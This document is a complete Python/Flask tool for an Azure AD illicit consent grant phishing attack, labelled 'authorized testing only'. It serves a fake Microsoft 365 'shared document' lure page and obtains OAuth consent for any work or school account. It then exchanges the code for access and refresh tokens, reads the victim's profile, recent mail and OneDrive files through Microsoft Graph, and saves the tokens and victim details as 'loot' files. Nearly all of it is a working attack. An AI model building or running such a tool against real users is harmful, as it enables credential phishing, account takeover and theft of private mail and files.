#!/usr/bin/env python3
"""
consent_grab.py - Azure AD / Entra ID illicit consent grant attack demonstrator.

** Authorized security testing / red-team engagement use only. **
"""

import argparse
import datetime as _dt
import json
import sys
import urllib.parse
from pathlib import Path

try:
    import requests
    from flask import Flask, Response, redirect, request
except ImportError:
    sys.exit(
        "Missing dependencies. Install them with:\n"
        "    pip install -r requirements.txt\n"
        "(or: pip install flask requests)"
    )


# --------------------------------------------------------------------------- #
# Persistent state — remembers the last used scope across runs
# --------------------------------------------------------------------------- #
STATE_FILE = Path(__file__).parent / ".consent_grab_state.json"
FALLBACK_SCOPE = "openid profile email User.Read offline_access"


def load_last_scope() -> str:
    try:
        return json.loads(STATE_FILE.read_text()).get("last_scope", FALLBACK_SCOPE)
    except (OSError, ValueError, KeyError):
        return FALLBACK_SCOPE


def save_last_scope(scope: str) -> None:
    try:
        STATE_FILE.write_text(json.dumps({"last_scope": scope}))
    except OSError:
        pass


# --------------------------------------------------------------------------- #
# Configuration (populated from CLI in main())
# --------------------------------------------------------------------------- #
class Config:
    client_id = ""
    client_secret = ""
    redirect_uri = ""
    scope = ""
    authority = "https://login.microsoftonline.com"
    graph = "https://graph.microsoft.com"
    host = "0.0.0.0"
    port = 5000
    public_url = ""
    pretext = "Microsoft 365 Document"
    loot_dir = Path("loot")


CFG = Config()
TENANT = "organizations"  # fixed: allows any Entra ID work/school account


# --------------------------------------------------------------------------- #
# OAuth helpers
# --------------------------------------------------------------------------- #
def authorize_url(state: str = "demo") -> str:
    params = {
        "client_id": CFG.client_id,
        "response_type": "code",
        "redirect_uri": CFG.redirect_uri,
        "response_mode": "query",
        "scope": CFG.scope,
        "state": state,
        "prompt": "consent",
    }
    return f"{CFG.authority}/{TENANT}/oauth2/v2.0/authorize?" + urllib.parse.urlencode(params)


def exchange_code_for_token(code: str) -> dict:
    data = {
        "client_id": CFG.client_id,
        "client_secret": CFG.client_secret,
        "code": code,
        "redirect_uri": CFG.redirect_uri,
        "grant_type": "authorization_code",
        "scope": CFG.scope,
    }
    resp = requests.post(f"{CFG.authority}/{TENANT}/oauth2/v2.0/token", data=data, timeout=30)
    try:
        body = resp.json()
    except ValueError:
        body = {"raw": resp.text}
    body["_http_status"] = resp.status_code
    return body


def graph_get(path: str, access_token: str) -> dict:
    url = f"{CFG.graph}/v1.0/{path.lstrip('/')}"
    try:
        resp = requests.get(url, headers={"Authorization": f"Bearer {access_token}"}, timeout=30)
        try:
            return {"status": resp.status_code, "body": resp.json()}
        except ValueError:
            return {"status": resp.status_code, "body": resp.text}
    except requests.RequestException as exc:
        return {"status": "error", "body": str(exc)}


def demonstrate_access(access_token: str) -> dict:
    return {
        "me": graph_get("me", access_token),
        "messages": graph_get("me/messages?$top=5&$select=subject,from,receivedDateTime", access_token),
        "drive": graph_get("me/drive/root/children?$top=5&$select=name,size", access_token),
    }


def save_loot(record: dict) -> Path:
    CFG.loot_dir.mkdir(parents=True, exist_ok=True)
    stamp = _dt.datetime.now().strftime("%Y%m%d-%H%M%S-%f")
    try:
        upn = record["graph"]["me"]["body"].get("userPrincipalName", "unknown")
    except (KeyError, AttributeError, TypeError):
        upn = "unknown"
    safe_upn = "".join(c for c in str(upn) if c.isalnum() or c in "._-@") or "unknown"
    out = CFG.loot_dir / f"{stamp}_{safe_upn}.json"
    out.write_text(json.dumps(record, indent=2, default=str))
    return out


# --------------------------------------------------------------------------- #
# Web application
# --------------------------------------------------------------------------- #
app = Flask(__name__)

PAGE = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
  :root {{ color-scheme: light; }}
  * {{ box-sizing: border-box; }}
  body {{
    margin: 0; font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
    background: #f3f2f1; color: #201f1e;
    display: flex; min-height: 100vh; align-items: center; justify-content: center;
  }}
  .card {{
    background: #fff; width: 100%; max-width: 440px; padding: 44px 44px 36px;
    border-radius: 2px; box-shadow: 0 2px 6px rgba(0,0,0,.18), 0 0 2px rgba(0,0,0,.12);
  }}
  .logo {{ display: grid; grid-template-columns: 11px 11px; gap: 2px; width: 24px; margin-bottom: 18px; }}
  .logo span {{ width: 11px; height: 11px; }}
  .logo span:nth-child(1) {{ background: #f25022; }}
  .logo span:nth-child(2) {{ background: #7fba00; }}
  .logo span:nth-child(3) {{ background: #00a4ef; }}
  .logo span:nth-child(4) {{ background: #ffb900; }}
  h1 {{ font-size: 21px; font-weight: 600; margin: 0 0 6px; }}
  p {{ font-size: 14px; line-height: 1.5; color: #605e5c; margin: 0 0 22px; }}
  .file {{
    display: flex; align-items: center; gap: 12px; padding: 14px;
    border: 1px solid #edebe9; border-radius: 4px; margin-bottom: 24px;
  }}
  .file .ico {{ font-size: 26px; }}
  .file .name {{ font-size: 14px; font-weight: 600; }}
  .file .sub {{ font-size: 12px; color: #a19f9d; }}
  a.btn {{
    display: block; text-align: center; text-decoration: none;
    background: #0067b8; color: #fff; font-size: 15px; font-weight: 600;
    padding: 11px; border: none; cursor: pointer;
  }}
  a.btn:hover {{ background: #005da6; }}
  .foot {{ margin-top: 26px; font-size: 11px; color: #a19f9d; text-align: center; }}
</style>
</head>
<body>
  <div class="card">
    <div class="logo"><span></span><span></span><span></span><span></span></div>
    <h1>{title}</h1>
    <p>A document has been shared with you. Sign in with your work or school
       account to review and open it.</p>
    <div class="file">
      <div class="ico">&#128196;</div>
      <div>
        <div class="name">Shared_Document.docx</div>
        <div class="sub">Microsoft 365 &bull; Protected</div>
      </div>
    </div>
    <a class="btn" href="{auth_url}">Open in Microsoft 365</a>
    <div class="foot">Secured by Microsoft identity platform</div>
  </div>
</body>
</html>"""

RESULT_PAGE = """<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading...</title>
<style>
  body {{ font-family: "Segoe UI", system-ui, sans-serif; background:#f3f2f1;
         display:flex; min-height:100vh; align-items:center; justify-content:center; }}
  .card {{ background:#fff; max-width:460px; padding:40px; border-radius:4px;
          box-shadow:0 2px 6px rgba(0,0,0,.18); text-align:center; }}
  h1 {{ font-size:20px; color:#201f1e; }}
  p {{ color:#605e5c; font-size:14px; line-height:1.5; }}
</style></head>
<body><div class="card">
  <h1>{heading}</h1>
  <p>{message}</p>
</div></body></html>"""


@app.route("/")
def landing():
    return Response(PAGE.format(title=CFG.pretext, auth_url=authorize_url()), mimetype="text/html")


@app.route("/go")
def go():
    return redirect(authorize_url())


@app.route("/callback")
def callback():
    error = request.args.get("error")
    if error:
        desc = request.args.get("error_description", "")
        print(f"\n[!] Consent flow error: {error}\n    {desc}\n")
        return Response(
            RESULT_PAGE.format(heading="Sign-in was cancelled", message="You can close this window."),
            mimetype="text/html",
        )

    code = request.args.get("code")
    if not code:
        return Response(
            RESULT_PAGE.format(heading="Invalid request", message="No authorization code was provided."),
            status=400, mimetype="text/html",
        )

    state = request.args.get("state", "")
    print("\n" + "=" * 70)
    print(f"[+] CALLBACK HIT  from {request.remote_addr}  (state={state})")
    print(f"[+] Authorization code: {code[:24]}... ({len(code)} chars)")

    tokens = exchange_code_for_token(code)
    record = {
        "captured_at": _dt.datetime.now().isoformat(),
        "victim_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
        "state": state,
        "tokens": tokens,
    }

    access_token = tokens.get("access_token")
    if access_token:
        print(f"[+] ACCESS TOKEN captured ({len(access_token)} chars)")
        if tokens.get("refresh_token"):
            print(f"[+] REFRESH TOKEN captured ({len(tokens['refresh_token'])} chars)")
        print(f"[+] Scopes granted: {tokens.get('scope', '(none reported)')}")
        print("[*] Exercising token against Microsoft Graph...")
        record["graph"] = demonstrate_access(access_token)
        try:
            who = record["graph"]["me"]["body"].get("userPrincipalName", "?")
            print(f"[+] Token belongs to: {who}")
        except (KeyError, AttributeError, TypeError):
            pass
    else:
        print(f"[!] Token exchange failed (HTTP {tokens.get('_http_status')}):")
        print(f"    {tokens.get('error')}: {tokens.get('error_description', '')}")

    loot_path = save_loot(record)
    print(f"[+] Saved to: {loot_path}")
    print("=" * 70 + "\n")

    return Response(
        RESULT_PAGE.format(
            heading="You're all set",
            message="The document is opening in a new tab. You can close this window.",
        ),
        mimetype="text/html",
    )


@app.route("/health")
def health():
    return {"status": "ok", "callback": CFG.redirect_uri}


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def build_parser() -> argparse.ArgumentParser:
    last_scope = load_last_scope()
    p = argparse.ArgumentParser(
        description="Azure illicit consent grant attack demonstrator (authorized testing only).",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--client-id", required=True,
                   help="Application (client) ID of the registered Azure AD app.")
    p.add_argument("--client-secret", required=True,
                   help="Client secret value of the registered app.")
    p.add_argument("--scope", default=last_scope,
                   help="Space-separated delegated scopes to request consent for.")
    p.add_argument("--port", type=int, default=5000,
                   help="Port to host the web server on.")
    p.add_argument("--host", default="0.0.0.0",
                   help="Interface to bind the web server to.")
    p.add_argument("--public-url", default=None,
                   help="Externally reachable base URL (e.g. https://your-ngrok-host.com). "
                        "Defaults to http://localhost:<port>.")
    p.add_argument("--redirect-uri", default=None,
                   help="Override the redirect_uri. Defaults to <public-url>/callback.")
    p.add_argument("--pretext", default="Microsoft 365 Document",
                   help="Title/lure text shown on the landing page.")
    p.add_argument("--loot-dir", default="loot",
                   help="Directory to write captured tokens to.")
    p.add_argument("--debug", action="store_true",
                   help="Run Flask in debug mode.")
    return p


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)

    CFG.client_id = args.client_id
    CFG.client_secret = args.client_secret
    CFG.scope = args.scope
    CFG.host = args.host
    CFG.port = args.port
    CFG.pretext = args.pretext
    CFG.loot_dir = Path(args.loot_dir)

    display_host = "localhost" if args.host in ("0.0.0.0", "") else args.host
    CFG.public_url = (args.public_url or f"http://{display_host}:{args.port}").rstrip("/")
    CFG.redirect_uri = args.redirect_uri or f"{CFG.public_url}/callback"

    save_last_scope(args.scope)

    banner = f"""
======================================================================
  Azure Illicit Consent Grant - Demonstrator
  (authorized security testing use only)
======================================================================
  Client ID ..... {CFG.client_id}
  Scopes ........ {CFG.scope}
  Redirect URI .. {CFG.redirect_uri}
  Loot dir ...... {CFG.loot_dir.resolve()}
----------------------------------------------------------------------
  Listening on .. http://{CFG.host}:{CFG.port}
  Lure (landing)  {CFG.public_url}/
  Direct consent  {CFG.public_url}/go
======================================================================
"""
    print(banner)

    app.run(host=CFG.host, port=CFG.port, debug=args.debug, use_reloader=False)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
